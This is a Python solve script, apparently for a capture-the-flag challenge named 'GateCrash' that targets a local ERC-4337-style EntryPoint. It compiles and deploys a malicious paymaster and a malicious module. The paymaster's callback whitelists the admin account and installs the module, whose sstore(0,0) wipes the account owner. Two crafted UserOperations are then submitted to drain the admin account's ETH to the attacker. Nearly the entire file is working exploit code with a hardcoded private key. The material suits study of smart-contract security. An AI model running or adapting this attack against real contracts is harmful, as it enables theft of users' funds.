#!/usr/bin/env python3
"""
GateCrash Exploit — Route B: attackerAccount signs Op[0] with real ECDSA signature.

C1 fix: opHash = keccak256(abi.encode(fields excluding signature))
         → no more circular dependency → signature path is now viable.

H1 fix: EntryPoint requires registeredSenders[op.sender] == true.
         Only Factory-created accounts are registered.
         → MockAccount bypass is closed.

Attack flow:
  1. Deploy MaliciousModule (sstore(0,0) to zero admin's slot 0)
  2. Deploy MaliciousPaymaster (addToPreApproved + adminUpdateModule in callback)
  3. Query Setup for challenge addresses & nonces
  4. Build Op[0]: attackerAccount (ECDSA-signed) + MaliciousPaymaster
     → validateUserOp passes signature check (attacker holds private key)
     → Paymaster callback: add admin to preApproved + set malicious module
  5. Build Op[1]: Admin account → delegatecall module → sstore(0,0) zeros owner
     → preApproved bypasses signature → execute() drains ETH
  6. Call EntryPoint.handleOps
  7. Verify Setup.isSolved()
"""

import json
import os
import sys
import solcx

solcx.set_solc_version('0.8.19')
from web3 import Web3
from eth_account import Account
from eth_account.messages import encode_defunct
from eth_abi import encode as abi_encode


ENTRYPOINT_ABI = [
    {
        "inputs": [
            {
                "components": [
                    {"name": "sender", "type": "address"},
                    {"name": "nonce", "type": "uint256"},
                    {"name": "initCode", "type": "bytes"},
                    {"name": "callData", "type": "bytes"},
                    {"name": "callGasLimit", "type": "uint256"},
                    {"name": "verificationGasLimit", "type": "uint256"},
                    {"name": "preVerificationGas", "type": "uint256"},
                    {"name": "maxFeePerGas", "type": "uint256"},
                    {"name": "maxPriorityFeePerGas", "type": "uint256"},
                    {"name": "paymasterAndData", "type": "bytes"},
                    {"name": "signature", "type": "bytes"}
                ],
                "name": "ops",
                "type": "tuple[]"
            },
            {"name": "beneficiary", "type": "address"}
        ],
        "name": "handleOps",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
]

SETUP_ABI = [
    {"inputs": [], "name": "entryPoint",      "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "factory",         "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "adminAccount",    "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "attackerAccount", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "adminOwner",      "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "attackerOwner",   "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "isSolved",        "outputs": [{"type": "bool"}],    "stateMutability": "view", "type": "function"},
]

BASEACCOUNT_ABI = [
    {"inputs": [{"name": "dest", "type": "address"}, {"name": "value", "type": "uint256"}, {"name": "func", "type": "bytes"}], "name": "execute", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "nonce", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "owner", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
]


def compute_op_hash(op_tuple):
    """
    Compute opHash matching EntryPoint's Solidity formula (C1-fixed):

        keccak256(abi.encode(
            op.sender,
            op.nonce,
            keccak256(op.initCode),
            keccak256(op.callData),
            op.callGasLimit,
            op.verificationGasLimit,
            op.preVerificationGas,
            op.maxFeePerGas,
            op.maxPriorityFeePerGas,
            keccak256(op.paymasterAndData)
        ))

    op_tuple = (sender, nonce, initCode, callData, callGasLimit,
                verificationGasLimit, preVerificationGas, maxFeePerGas,
                maxPriorityFeePerGas, paymasterAndData, _signature_ignored)
    """
    (sender, nonce, initCode, callData, callGasLimit,
     verificationGasLimit, preVerificationGas, maxFeePerGas,
     maxPriorityFeePerGas, paymasterAndData, _sig) = op_tuple

    return Web3.keccak(abi_encode(
        ['address', 'uint256', 'bytes32', 'bytes32', 'uint256',
         'uint256', 'uint256', 'uint256', 'uint256', 'bytes32'],
        [
            sender,
            nonce,
            Web3.keccak(initCode),
            Web3.keccak(callData),
            callGasLimit,
            verificationGasLimit,
            preVerificationGas,
            maxFeePerGas,
            maxPriorityFeePerGas,
            Web3.keccak(paymasterAndData)
        ]
    ))


def sign_user_op(op_tuple, private_key):
    """
    Sign a UserOperation with ECDSA, matching BaseAccount._validateSignature:
      digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", opHash))
      ecrecover(digest, v, r, s) == owner
    """
    op_hash = compute_op_hash(op_tuple)
    signable = encode_defunct(primitive=op_hash)
    signed = Account.from_key(private_key).sign_message(signable)
    return signed.signature  # 65 bytes: r(32) + s(32) + v(1)


def compile_contracts():
    """Compile MaliciousModule and MaliciousPaymaster."""
    try:
        from solcx import compile_source, install_solc
        install_solc("0.8.19")
    except ImportError:
        print("[!] Please install solcx: pip install py-solc-x")
        sys.exit(1)

    source = """
pragma solidity ^0.8.19;

struct UserOperation {
    address sender; uint256 nonce; bytes initCode; bytes callData;
    uint256 callGasLimit; uint256 verificationGasLimit; uint256 preVerificationGas;
    uint256 maxFeePerGas; uint256 maxPriorityFeePerGas;
    bytes paymasterAndData; bytes signature;
}

interface IEntryPoint {
    function addToPreApproved(address sender) external;
    function adminUpdateModule(address account, address newModule) external;
}

contract MaliciousModule {
    function preValidate(address, bytes32) external {
        assembly { sstore(0, 0) }
    }
}

contract MaliciousPaymaster {
    IEntryPoint public immutable entryPoint;
    address public target;
    address public mod;

    constructor(address _entryPoint, address _target, address _mod) {
        entryPoint = IEntryPoint(_entryPoint);
        target = _target;
        mod = _mod;
    }

    function validatePaymasterUserOp(
        UserOperation calldata, bytes32, uint256
    ) external returns (bytes memory context, uint256 validationData) {
        entryPoint.addToPreApproved(target);
        entryPoint.adminUpdateModule(target, mod);
        context = new bytes(0);
        validationData = 0;
    }

    function postOp(uint8, bytes calldata, uint256) external {}
}
"""
    compiled = compile_source(source, output_values=["abi", "bin"])
    return {
        "module": compiled["<stdin>:MaliciousModule"],
        "paymaster": compiled["<stdin>:MaliciousPaymaster"]
    }


def deploy_contract(w3, bytecode, abi, constructor_args, pk):
    acct = Account.from_key(pk)
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx = contract.constructor(*constructor_args).build_transaction({
        "from": acct.address,
        "nonce": w3.eth.get_transaction_count(acct.address),
        "gas": 2000000,
        "gasPrice": w3.eth.gas_price
    })
    signed_tx = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Contract deployed: {receipt.contractAddress}")
    return receipt.contractAddress


def main():
    print("=" * 50)
    print(" GateCrash — Exploit (Route B: ECDSA signature)")
    print("=" * 50)
    print()

    rpc_url = os.environ.get("RPC", "http://127.0.0.1:38545")
    attacker_pk = os.environ.get(
        "PK",
        "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a")
    setup_addr = os.environ.get("SETUP", "")

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        print(f"[!] Cannot connect to RPC: {rpc_url}")
        return

    print(f"[*] RPC:    {rpc_url}")
    print(f"[*] Block:  {w3.eth.block_number}")
    attacker_acct = Account.from_key(attacker_pk)
    print(f"[*] Attacker: {attacker_acct.address}")

    # ── Get Setup address ──────────────────────────────────────────
    if not setup_addr:
        print("[!] SETUP env variable not set. Attempting to read from local deploy info...")
        candidates = [
            os.path.join(os.path.dirname(__file__), "..", "env", "deployed_addresses.json"),
            os.path.join(os.getcwd(), "env", "deployed_addresses.json"),
        ]
        for p in candidates:
            p = os.path.normpath(os.path.abspath(p))
            if os.path.exists(p):
                with open(p) as f:
                    info = json.load(f)
                setup_addr = info.get("setup", "")
                if setup_addr:
                    print(f"[*] Setup (from file): {setup_addr}")
                    break

    if not setup_addr:
        print("[!] Cannot find Setup address. Set SETUP env or ensure deployed_addresses.json exists.")
        return

    setup_addr = Web3.to_checksum_address(setup_addr)
    setup = w3.eth.contract(address=setup_addr, abi=SETUP_ABI)

    # ── Query Setup ──────────────────────────────────────────────
    print("\n[*] Querying Setup for challenge addresses...")
    entry_point_addr   = setup.functions.entryPoint().call()
    admin_account_addr = setup.functions.adminAccount().call()
    attacker_acct_addr = setup.functions.attackerAccount().call()
    attacker_owner     = setup.functions.attackerOwner().call()

    print(f"    EntryPoint:       {entry_point_addr}")
    print(f"    Admin Account:    {admin_account_addr}")
    print(f"    Attacker Account: {attacker_acct_addr}")
    print(f"    Attacker Owner:   {attacker_owner}")

    # Verify attacker holds the private key for attackerAccount
    attacker_owner_onchain = w3.eth.contract(
        address=Web3.to_checksum_address(attacker_acct_addr),
        abi=BASEACCOUNT_ABI
    ).functions.owner().call()
    if attacker_owner_onchain.lower() != attacker_acct.address.lower():
        print(f"\n[!] WARNING: Attacker PK ({attacker_acct.address}) != attackerAccount.owner ({attacker_owner_onchain})")
        print("[!] The signature will be rejected! Check your PK env variable.")
        return
    print(f"    [OK] Attacker PK matches attackerAccount.owner")

    if setup.functions.isSolved().call():
        print("\n[+] Challenge already solved!")
        return

    admin_balance = w3.eth.get_balance(admin_account_addr)
    print(f"\n[*] Admin balance: {w3.from_wei(admin_balance, 'ether')} ETH")

    admin_account = w3.eth.contract(
        address=Web3.to_checksum_address(admin_account_addr), abi=BASEACCOUNT_ABI)
    entry_point = w3.eth.contract(
        address=Web3.to_checksum_address(entry_point_addr), abi=ENTRYPOINT_ABI)

    # ── Step 1: Compile attack contracts ──────────────────────────
    print("\n[STEP 1] Compiling MaliciousModule + MaliciousPaymaster...")
    contracts = compile_contracts()

    # ── Step 2: Deploy MaliciousModule ────────────────────────────
    print("\n[STEP 2] Deploying MaliciousModule...")
    module_addr = deploy_contract(
        w3, contracts["module"]["bin"], contracts["module"]["abi"], [], attacker_pk)

    # ── Step 3: Deploy MaliciousPaymaster ─────────────────────────
    print("\n[STEP 3] Deploying MaliciousPaymaster...")
    paymaster_addr = deploy_contract(
        w3, contracts["paymaster"]["bin"], contracts["paymaster"]["abi"],
        [entry_point_addr, admin_account_addr, module_addr], attacker_pk)

    # ── Step 4: Query nonces ──────────────────────────────────────
    print("\n[STEP 4] Querying nonces...")
    attacker_acct_contract = w3.eth.contract(
        address=Web3.to_checksum_address(attacker_acct_addr), abi=BASEACCOUNT_ABI)
    attacker_nonce = attacker_acct_contract.functions.nonce().call()
    admin_nonce = admin_account.functions.nonce().call()
    print(f"    Attacker nonce: {attacker_nonce}")
    print(f"    Admin nonce:    {admin_nonce}")

    # ── Step 5: Build Op[0] — attackerAccount + MaliciousPaymaster ─
    print("\n[STEP 5] Building Op[0]: attackerAccount + MaliciousPaymaster...")
    print("    Computing opHash & ECDSA signature...")

    op0_unsigned = (
        Web3.to_checksum_address(attacker_acct_addr),  # sender = attackerAccount
        attacker_nonce,                                  # nonce
        b"",                                             # initCode
        b"",                                             # callData (empty, caught by fallback)
        200000,                                          # callGasLimit
        300000,                                          # verificationGasLimit
        50000,                                           # preVerificationGas
        1000000000,                                      # maxFeePerGas
        1000000000,                                      # maxPriorityFeePerGas
        Web3.to_bytes(hexstr=paymaster_addr),            # paymasterAndData
        b"",                                             # signature placeholder
    )

    op0_hash = compute_op_hash(op0_unsigned)
    print(f"    opHash = 0x{op0_hash.hex()}")

    op0_sig = sign_user_op(op0_unsigned, attacker_pk)
    print(f"    signature ({len(op0_sig)} bytes) = 0x{op0_sig.hex()}")

    op0 = op0_unsigned[:10] + (op0_sig,)
    print("    Op[0]: attackerAccount (signed) → MaliciousPaymaster → whitelist + set module")

    # ── Step 6: Build Op[1] — Admin drain ─────────────────────────
    print("\n[STEP 6] Building Op[1]: Admin transfer → attacker...")

    execute_selector = Web3.keccak(text="execute(address,uint256,bytes)")[:4]
    admin_call_data = execute_selector + abi_encode(
        ["address", "uint256", "bytes"],
        [attacker_acct.address, admin_balance, b""])

    op1 = (
        Web3.to_checksum_address(admin_account_addr),  # sender = AdminAccount
        admin_nonce,                                     # nonce
        b"",                                             # initCode
        admin_call_data,                                 # callData
        200000,                                          # callGasLimit
        300000,                                          # verificationGasLimit
        50000,                                           # preVerificationGas
        1000000000,                                      # maxFeePerGas
        1000000000,                                      # maxPriorityFeePerGas
        b"",                                             # paymasterAndData (none)
        b"",                                             # signature (bypassed: preApproved + module)
    )
    print("    Op[1]: Admin → delegatecall module (sstore 0,0) → preApproved → drain")

    # ── Step 7: Execute handleOps ─────────────────────────────────
    print("\n[STEP 7] Executing handleOps([Op[0], Op[1]])...")

    gas_price = w3.eth.gas_price

    tx = entry_point.functions.handleOps(
        [op0, op1],
        attacker_acct.address
    ).build_transaction({
        "from": attacker_acct.address,
        "nonce": w3.eth.get_transaction_count(attacker_acct.address),
        "gas": 3000000,
        "gasPrice": gas_price
    })

    signed_tx = attacker_acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"\n[*] TX sent: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[*] Status: {'SUCCESS' if receipt.status == 1 else 'FAILED'}")
    print(f"[*] Gas used: {receipt.gasUsed}")

    # ── Step 8: Verify ───────────────────────────────────────────
    print("\n[STEP 8] Verifying...")
    new_admin_balance = w3.eth.get_balance(admin_account_addr)
    print(f"    Admin balance (before): {w3.from_wei(admin_balance, 'ether')} ETH")
    print(f"    Admin balance (after):  {w3.from_wei(new_admin_balance, 'ether')} ETH")
    print(f"    isSolved(): {setup.functions.isSolved().call()}")

    if new_admin_balance == 0:
        print("\n" + "=" * 50)
        print(" Attack successful! Admin drained.")
        print("=" * 50)
    else:
        print("\n[!] Attack may have failed — admin balance not zero")


if __name__ == "__main__":
    main()
